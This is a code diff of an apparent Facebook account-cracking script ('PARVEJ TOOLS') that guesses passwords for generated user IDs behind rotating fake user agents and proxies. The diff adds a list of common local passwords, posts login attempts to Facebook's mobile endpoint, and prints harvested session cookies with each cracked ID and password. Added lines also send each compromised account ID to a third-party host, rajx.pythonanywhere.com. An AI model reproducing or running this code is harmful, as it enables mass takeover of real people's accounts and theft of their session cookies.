@@ -55,13 +55,9 @@ loop = 0
 oks = []
 cps = []
 
-ua = ["Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; Xiaomi MI 4(MI 4W) Build/KTU84P) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24 T5/2.0 baidubrowser/5.6.3.0 (Baidu; P1 4.4.4)",]
-ua = ["Mozilla/5.0 (Linux; U; Android 13; en-gb; Xiaomi 13 Ultra Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.37.1-gn",]
-ua = ["Mozilla/5.0 (Linux; U; Android 13; fr-fr; TECNO CK6 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 PHX/13.6",]
-ua = ["Mozilla/5.0 (Linux; U; Android 13; es-es; Redmi Pad Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2.2-gn",]
-ua = ["Mozilla/5.0 (Linux; Android 12; Armor X10 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
-ua = ["Mozilla/5.0 (Linux; Android 12; 2209116AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.3.3557.65821",]
-ua = ["Mozilla/5.0 (Linux; Android 13; TECNO CK9n Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/361.0.0.12.5;]",]
+ua = 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 GSA/11.2.9.21.arm'
+ua = 'Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH1881 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10'
+ua = 'Mozilla/5.0 (Linux; Android 9; STK-LX1 Build/HUAWEISTK-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91'
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -86,11 +82,11 @@ prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
     aa='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
+    c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    g='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
@@ -98,10 +94,13 @@ for xd in range(10000):
     l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
-logo = ("""\033[1;33m
-   █▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
-─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
-░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+logo = ("""
+\033[1;33m d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
+\033[1;33m 88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
+\033[1;32m 88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
+\033[1;32m 88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
+\033[1;36m 88      88   88 88 `88.  `8bd8'  88.     db. 88  
+\033[1;36m 88      YP   YP 88   YD    YP    Y88888P Y8888P  
                                                  
 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO PARVEJ TOOLS               \033[;0m\033[1;91m\033[1;92m
 
@@ -220,14 +219,14 @@ def v3():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' \033[1;33m[♥]  TOTAL IDS :\033[1;92m '+tl)
+        print(' \033[1;33m [♥]  TOTAL IDS :\033[1;92m '+tl)
         print(f"\033[1;33m[♥]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
-        print(' \033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
-        print(' \033[1;33m[♥]  WAIT FOR IDS ')
+        print(' \033[1;33m [♥]  THE CRACK PROCESS HAS BEEN STARTED')
+        print(' \033[1;33m [♥]  WAIT FOR IDS ')
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','708090','908070','free fire','freefire1234']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [♥] Crack process has been completed')
@@ -256,36 +255,38 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=PZIaZTO7cIlmgN0LTST2FJHJ; locale=en_US; vpd=v1%3B703x393x2.75; sb=T5IaZexMrQS6x5vd8I40fXwH; fr=0ZkxapHN6qb66vOIr..BlGpI9.bJ.AAA.0.0.BlHTRp.AWV5Pe1ANcg',
-    'dpr': '2.75',
-    'referer': 'https://www.google.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"V2127"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
+            'authority': 'www.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'referer': 'https://web.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+            'viewport-width': '980',
 }
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[PARVEJ-OK🌻] {uid}|{ps}")
-                print(f"\n[COOKIE🎁] : {coki}")
-                open('/sdcard/PARVEJ/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
+                if 'LOCK' in res:
+                    return 'LOCK'
+                else:
+                    print(f'  \r\033[1;92m  [PAJVEJ-OK👨‍💻] '+uid+' • '+ps+'\33[0;92m')
+                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
